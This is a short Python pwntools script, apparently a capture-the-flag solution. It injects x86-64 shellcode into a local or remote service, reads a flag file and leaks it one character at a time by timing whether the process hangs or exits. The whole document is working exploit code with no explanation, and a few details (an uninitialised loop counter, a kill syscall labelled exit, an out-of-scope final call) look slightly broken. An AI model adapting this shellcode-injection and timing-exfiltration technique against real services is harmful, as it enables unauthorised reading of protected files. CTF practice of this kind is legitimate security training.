from pwn import *

REMOTE = False
context.arch = 'amd64'


def get_filename(c, idx):
    if REMOTE:
        r = remote('100.90.0.178', 30002)
    else:
        r = process('./main')
    shellcode = b''
    shellcode += asm(shellcraft.open('./flag-fc66ff0869d1b9afc9024e91b9af7e8b9bbe09e1'))
    shellcode += asm(shellcraft.read('rax', 'rsp', 0x100)); # read flag
    shellcode += asm(
        f'''
        xor rdx, rdx
        mov dl, byte ptr[rsp+{idx}]
        cmp dl, {c}
        je loop
        jne exit
        exit:
            xor rax, rax
            mov rax, 0x3e
            syscall
        loop:
            inc rcx
            cmp rcx, 0x21212121
            jne loop
        '''
    )
    r.send(shellcode)
    try:
        r.recvline(timeout=1)
    except:
        r.close()
        return False
    return True
stack_msg = b''
for i in range(0x100):
    for j in range(0x20, 0x7f) :
        if get_filename(j, i):
            stack_msg += bytes([j])
            print(stack_msg)
            break
r.interactive()
